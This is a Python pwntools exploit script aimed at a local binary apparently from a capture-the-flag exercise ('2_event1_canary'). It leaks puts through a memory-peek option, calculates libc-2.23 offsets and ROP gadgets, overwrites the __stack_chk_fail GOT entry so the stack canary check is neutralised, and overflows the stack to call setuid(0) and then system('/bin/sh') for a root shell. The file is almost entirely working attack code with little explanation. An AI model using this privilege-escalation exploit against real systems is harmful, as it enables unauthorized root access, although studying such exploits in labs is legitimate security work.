#!/usr/bin/python 

from pwn import * 

time = 0.2

# Starts processs
p = process("./2_event1_canary") 

def main():
	# Skip till `name`
	skip_prompt()

	# Create buffer of 100 bytes to preserve canary values
	buf = "A" * 100
	p.sendline(buf)

	log.warn("Canary values not overwritten yet so we will not be overflowing buffer for now.")
	log.warn("Sending buffer of %s Bytes only." %len(buf))
	
	# Skip `option` prompt
	skip_prompt()

	# Select option {1} peek memory address
	select_peek_memory()

	# readelf -r ./2_event1_canary | grep puts
	# 0804a020  00000607 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
	puts_GOT = 0x0804a020
	log.info("puts_GOT addr: 0x%x" %puts_GOT)

	# 0804a018  00000407 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
	stack_check_fail_GOT = 0x0804a018
	log.info("stack_check_fail_GOT addr: 0x%x" %stack_check_fail_GOT)
	
	# Determine the addr of puts_GOT by peeking
	send_addr_hex(puts_GOT)
	peek_results = p.recvrepeat(time)

	# Extract results
	puts_addr = ""
	puts_addr = extract_hex_addr(peek_results)
	log.info("puts addr: 0x%x" %puts_addr)
	
	# Calculate: libc base addr
	# objdump /lib/i386-linux-gnu/libc-2.23.so -d |grep "<_IO_puts@@GLIBC_2.0>"
	# 0005fca0 <_IO_puts@@GLIBC_2.0>:
	puts_offset = 0x0005fca0
	libc_base_addr = puts_addr - puts_offset
	log.info("libc base addr: 0x%x" %libc_base_addr)

	# Calculate: setuid addr
	# objdump -d /lib/i386-linux-gnu/libc-2.23.so | grep setuid
	# 000b12e0 <setuid@@GLIBC_2.0>:
	setuid_offset = 0x000b12e0
	setuid_addr = libc_base_addr + setuid_offset 
	log.info("setuid addr: 0x%x" %setuid_addr)

	# Calculate: system addr
	# objdump -d /lib/i386-linux-gnu/libc-2.23.so |grep system
	# 0003ada0 <__libc_system@@GLIBC_PRIVATE>:
	system_offset = 0x0003ada0
	system_addr = libc_base_addr + system_offset
	log.info("system addr: 0x%x" %system_addr)

	# Calculate: /bin/sh addr
	# strings -a -tx /lib/i386-linux-gnu/libc-2.23.so |grep '/bin/sh'
	# 15ba0b /bin/sh
	bin_sh_offset = 0x15ba0b
	bin_sh_addr = libc_base_addr + bin_sh_offset
	log.info("/bin/sh addr: 0x%x" %bin_sh_addr)

	# Calculate: pop eax ; ret
	# 0x0002406e : pop eax ; ret
	pop_eax_ret_offset = 0x0002406e
	pop_eax_ret_addr = libc_base_addr + pop_eax_ret_offset 
	log.info("pop eax; ret addr: 0x%x" %pop_eax_ret_addr)

	# Calculate: pop ebx ; ret
	# 0x00018395 : pop ebx ; ret
	pop_ebx_ret_offset = 0x00018395
	pop_ebx_ret_addr = libc_base_addr + pop_ebx_ret_offset
	log.info("pop ebx; ret addr: 0x%x" %pop_ebx_ret_addr)

	# Calculate: pop edx ; ret
	# 0x00001aa6 : pop edx ; ret
	pop_edx_ret_offset = 0x00001aa6
	pop_edx_ret_addr = libc_base_addr + pop_edx_ret_offset 
	log.info("pop edx; ret addr: 0x%x" %pop_edx_ret_addr)

	# Calculate: nop ; ret
	# 0x0000a22c : nop ; ret
	nop_ret_offset = 0x0000a22c
	nop_ret_addr = libc_base_addr + nop_ret_offset 
	log.info("nop; ret addr: 0x%x" %nop_ret_addr)

	# Calculate: ret
	# 0x00000417 : ret
	ret_offset = 0x00000417
	ret_addr = libc_base_addr + ret_offset
	log.info("ret addr: 0x%x" %ret_addr)

	# Calculate: jmp edx
	# 0x00001a6f : jmp edx
	jmp_edx_offset = 0x00001a6f
	jmp_edx_addr = libc_base_addr + jmp_edx_offset
	log.info("jmp edx addr: 0x%x" %jmp_edx_addr)

	# 0x00002c87 : int 0x80
	call_int_0x80_offset = 0x00002c87
	call_int_0x80_addr = libc_base_addr + call_int_0x80_offset
	log.info("int 0x80: 0x%x" %call_int_0x80_addr)

	# Overwrite __stack_chk_fail@GLIBC_2.4 with nop
	select_overwrite()
	overwrite(stack_check_fail_GOT, nop_ret_addr)
	log.warn("Canary overwritten!")

	# Setuid to root first and then trigger a system call to execute /bin/sh
	buf = "A" * 116
	log.warn("Creating Initial Payload")

	buf += p32(setuid_addr)
	buf += p32(pop_ebx_ret_addr)
	buf += p32(0x0)
	log.warn("Adding to payload: setuid(0)")

	buf += p32(system_addr)
	buf += '\x90' * 4
	buf += p32(bin_sh_addr)
	log.warn("Adding to payload: /bin/sh")

	select_name()
	send_to_stack(buf)
	log.warn("Payload sent!")

	# Attach debugger
	# raw_input(str(p.proc.pid))

	# Pass interaction back to user
	p.interactive()

def skip_prompt():
	p.recvrepeat(time)

def overwrite(addr_to_be_overwritten, new_value):
	# Sends the address to be overwritten 
	send_addr_hex(addr_to_be_overwritten)	
	log.info("Addr to be overwritten: 0x%x" %addr_to_be_overwritten)

	# Skips prompt and sends the value to be overwritten
	skip_prompt()
	send_addr_hex(new_value)
	log.warn("Overwriting it with: 0x%x" %new_value)
	skip_prompt()

def extract_hex_addr(peek_results):
	for i in peek_results.split("\n"): # Splits result by newlines
		if "Contents:" in i: # If hex addr is found, perform string operations
			hex_addr = i[ i.find("0x") : len(i) ]			

	hex_addr = int(hex_addr, 16) # Converts hex string to hex
	return hex_addr

def send_addr_hex(addr):
	p.sendline(hex(addr))

def send_to_stack(cmd):
	p.sendline(cmd)
	log.warn("Stored %s on the stack" %cmd)	

def select_peek_memory():
	p.sendline("1")
	skip_prompt()

def select_name():
	p.sendline("2")
	skip_prompt()

def select_overwrite():
	p.sendline("3")
	skip_prompt()

if __name__ == "__main__": 
	main()
